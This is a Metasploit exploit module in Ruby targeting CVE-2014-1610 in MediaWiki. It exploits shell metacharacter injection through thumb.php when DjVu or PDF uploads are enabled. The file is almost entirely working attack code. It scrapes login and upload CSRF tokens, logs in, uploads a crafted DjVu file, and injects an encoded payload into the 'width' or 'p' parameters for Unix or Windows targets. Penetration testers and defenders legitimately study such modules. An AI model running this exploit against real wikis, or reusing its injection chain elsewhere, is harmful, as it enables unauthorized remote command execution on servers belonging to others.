##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MediaWiki Thumb.php Remote Command Execution',
      'Description' => %q{
        MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 1.19.11,
      when DjVu  or PDF file upload support is enabled, allows remote unauthenticated
      users to execute arbitrary commands via shell metacharacters. If no target file
      is specified this module will attempt to log in with the provided credentials to
      upload a file (.DjVu) to use for exploitation.
      },
      'Author' =>
        [
          'Netanel Rubin', # from Check Point - Discovery
          'Brandon Perry', # Metasploit Module
          'Ben Harris', # Metasploit Module
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit Module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2014-1610' ],
          [ 'OSVDB', '102630'],
          [ 'URL', 'http://www.checkpoint.com/threatcloud-central/articles/2014-01-28-tc-researchers-discover.html' ],
          [ 'URL', 'https://bugzilla.wikimedia.org/show_bug.cgi?id=60339' ]
        ],
      'Privileged' => false,
      'Targets' =>
        [
          [ 'Automatic PHP-CLI',
            {
              'Payload' =>
                {
                  'BadChars' => "\r\n",
                  'PrependEncoder' => "php -r \"",
                  'AppendEncoder' => "\""
                },
              'Platform' => ['php'],
              'Arch' => ARCH_PHP
            }
          ],
          [ 'Linux CMD',
            {
              'Payload'        =>
                {
                  'BadChars' => "",
                  'Compat'      =>
                    {
                      'PayloadType' => 'cmd',
                      'RequiredCmd' => 'generic perl python php',
                    }
                },
              'Platform' => ['unix'],
              'Arch' => ARCH_CMD
            }
          ],
          [ 'Windows CMD',
            {
              'Payload'        =>
                {
                  'BadChars' => "",
                  'Compat'      =>
                    {
                      'PayloadType' => 'cmd',
                      'RequiredCmd' => 'generic perl',
                    }
                },
              'Platform' => ['win'],
              'Arch' => ARCH_CMD
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 28 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base MediaWiki path", '/mediawiki' ]),
        OptString.new('FILENAME', [ false, "Target DjVu/PDF file (e.g target.djvu target.pdf)", nil ]),
        OptString.new('USERNAME', [ false, "Username to authenticate with", '' ]),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", '' ])
      ], self.class)
  end

  def get_version(body)
    meta_generator = get_html_value(body, 'meta', 'generator', 'content')

    unless meta_generator
      vprint_status("No META Generator tag on #{full_uri}.")
      return nil, nil, nil
    end

    if meta_generator && meta_generator =~ /mediawiki/i
      vprint_status("#{meta_generator} detected.")
      meta_generator =~ /(\d)\.(\d+)[\.A-z]+(\d+)/
      major = $1.to_i
      minor = $2.to_i
      patch = $3.to_i
      vprint_status("Major:#{major} Minor:#{minor} Patch:#{patch}")

      return major, minor, patch
    end

    return nil, nil, nil
  end

  def check
    uri = target_uri.path

    opts = { 'uri' => normalize_uri(uri, 'index.php') }

    response = send_request_cgi!(opts)

    if opts['redirect_uri']
      vprint_status("Redirected to #{opts['redirect_uri']}.")
    end

    unless response
      vprint_status("No response from #{full_uri}.")
      return CheckCode::Unknown
    end

    # Mediawiki will give a 404 for unknown pages but still have a body
    if response.code == 200 || response.code == 404
      vprint_status("#{response.code} response received...")

      major, minor, patch = get_version(response.body)

      unless major
        return CheckCode::Unknown
      end

      if major == 1 && (minor < 8 || minor > 22)
        return CheckCode::Safe
      elsif major == 1 && (minor == 22 && patch > 1)
        return CheckCode::Safe
      elsif major == 1 && (minor == 21 && patch > 4)
        return CheckCode::Safe
      elsif major == 1 && (minor == 19 && patch > 10)
        return CheckCode::Safe
      elsif major == 1
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    end

    vprint_status("Received response code #{response.code} from #{full_uri}")
    CheckCode::Unknown
  end

  def exploit
    uri = target_uri.path

    print_status("Grabbing version and login CSRF token...")
    response = send_request_cgi({
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_get' => { 'title' => 'Special:UserLogin' }
    })

    unless response
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end

    server = response['Server']
    if server && target.name =~ /automatic/i && server =~ /win32/i
      vprint_status("Windows platform detected: #{server}.")
      my_platform = Msf::Module::Platform::Windows
    elsif server && target.name =~ /automatic/i
      vprint_status("Nix platform detected: #{server}.")
      my_platform = Msf::Module::Platform::Unix
    else
      my_platform = target.platform.platforms.first
    end

    # If we have already identified a DjVu/PDF file on the server trigger
    # the exploit
    unless datastore['FILENAME'].blank?
      payload_request(uri, datastore['FILENAME'], my_platform)
      return
    end

    username = datastore['USERNAME']
    password = datastore['PASSWORD']

    major, minor, patch = get_version(response.body)

    # Upload CSRF added in v1.18.2
    # http://www.mediawiki.org/wiki/Release_notes/1.18#Changes_since_1.18.1
    if ((major == 1) && (minor == 18) && (patch == 0 || patch == 1))
      upload_csrf = false
    elsif ((major == 1) && (minor < 18))
      upload_csrf = false
    else
      upload_csrf = true
    end

    session_cookie = response.get_cookies

    wp_login_token = get_html_value(response.body, 'input', 'wpLoginToken', 'value')

    if wp_login_token.blank?
      fail_with(Failure::UnexpectedReply, "Couldn't find login token. Is URI set correctly?")
    else
      print_good("Retrieved login CSRF token.")
    end

    print_status("Attempting to login...")
    login = send_request_cgi({
      'uri' => normalize_uri(uri, 'index.php'),
      'method' => 'POST',
      'vars_get' => {
        'title' => 'Special:UserLogin',
        'action' => 'submitlogin',
        'type' => 'login'
      },
      'cookie' => session_cookie,
      'vars_post' => {
        'wpName' => username,
        'wpPassword' => password,
        'wpLoginAttempt' => 'Log in',
        'wpLoginToken' => wp_login_token
      }
    })

    if login and login.code == 302
      print_good("Log in successful.")
    else
      fail_with(Failure::NoAccess, "Failed to log in.")
    end

    auth_cookie = login.get_cookies.gsub('mediawikiToken=deleted;','')

    # Testing v1.15.1 it looks like it has session fixation
    # vulnerability so we dont get a new session cookie after
    # authenticating. Therefore we need to include our old cookie.
    unless auth_cookie.include? 'session='
      auth_cookie << session_cookie
    end

    print_status("Getting upload CSRF token...") if upload_csrf
    upload_file = send_request_cgi({
      'uri' => normalize_uri(uri, 'index.php', 'Special:Upload'),
      'cookie' => auth_cookie
    })

    unless upload_file and upload_file.code == 200
      fail_with(Failure::NotFound, "Failed to access file upload page.")
    end

    wp_edit_token = get_html_value(upload_file.body, 'input', 'wpEditToken', 'value') if upload_csrf
    wp_upload = get_html_value(upload_file.body, 'input', 'wpUpload', 'value')
    title = get_html_value(upload_file.body, 'input', 'title', 'value')

    if upload_csrf && wp_edit_token.blank?
      fail_with(Failure::UnexpectedReply, "Couldn't find upload token. Is URI set correctly?")
    elsif upload_csrf
      print_good("Retrieved upload CSRF token.")
    end

    upload_mime = Rex::MIME::Message.new

    djvu_file = ::File.read(::File.join(Msf::Config.data_directory, "exploits", "cve-2014-1610", "metasploit.djvu"))
    file_name = "#{rand_text_alpha(4)}.djvu"

    upload_mime.add_part(djvu_file, "application/octet-stream", "binary", "form-data; name=\"wpUploadFile\"; filename=\"#{file_name}\"")
    upload_mime.add_part("#{file_name}", nil, nil, "form-data; name=\"wpDestFile\"")
    upload_mime.add_part("#{rand_text_alpha(4)}", nil, nil, "form-data; name=\"wpUploadDescription\"")
    upload_mime.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
    upload_mime.add_part("1",nil,nil, "form-data; name=\"wpIgnoreWarning\"")
    upload_mime.add_part(wp_edit_token, nil, nil, "form-data; name=\"wpEditToken\"") if upload_csrf
    upload_mime.add_part(title, nil, nil, "form-data; name=\"title\"")
    upload_mime.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
    upload_mime.add_part(wp_upload, nil, nil, "form-data; name=\"wpUpload\"")
    post_data = upload_mime.to_s

    print_status("Uploading DjVu file #{file_name}...")

    upload = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, 'index.php', 'Special:Upload'),
      'data'   => post_data,
      'ctype'  => "multipart/form-data; boundary=#{upload_mime.bound}",
      'cookie' => auth_cookie
    })

    if upload and upload.code == 302 and upload.headers['Location']
      location = upload.headers['Location']
      print_good("File uploaded to #{location}")
    else
      if upload.body.include? 'not a permitted file type'
        fail_with(Failure::NotVulnerable, "Wiki is not configured for target files.")
      else
        fail_with(Failure::UnexpectedReply, "Failed to upload file.")
      end
    end

    payload_request(uri, file_name, my_platform)
  end

  def payload_request(uri, file_name, my_platform)
    if my_platform == Msf::Module::Platform::Windows
      trigger = "1)&(#{payload.encoded})&"
    else
      trigger = "1;#{payload.encoded};"
    end

    vars_get = { 'f' => file_name }
    if file_name.include? '.pdf'
      vars_get['width'] = trigger
    elsif file_name.include? '.djvu'
      vars_get['width'] = 1
      vars_get['p'] = trigger
    else
      fail_with(Failure::BadConfig, "Unsupported file extension: #{file_name}")
    end

    print_status("Sending payload request...")
    r = send_request_cgi({
      'uri' => normalize_uri(uri, 'thumb.php'),
      'vars_get' => vars_get
    }, 1)

    if r && r.code == 404 && r.body =~ /not exist/
      print_error("File: #{file_name} does not exist.")
    elsif r
      print_error("Received response #{r.code}, exploit probably failed.")
    end
  end

  # The order of name, value keeps shifting so regex is painful.
  # Cant use nokogiri due to security issues
  # Cant use REXML directly as its not strict XHTML
  # So we do a filthy mixture of regex and REXML
  def get_html_value(html, type, name, value)
    return nil unless html
    return nil unless type
    return nil unless name
    return nil unless value

    found = nil
    html.each_line do |line|
      if line =~ /(<#{type}[^\/]*name="#{name}".*?\/>)/i
        found = $&
        break
      end
    end

    if found
      doc = REXML::Document.new found
      return doc.root.attributes[value]
    end

    ''
  end
end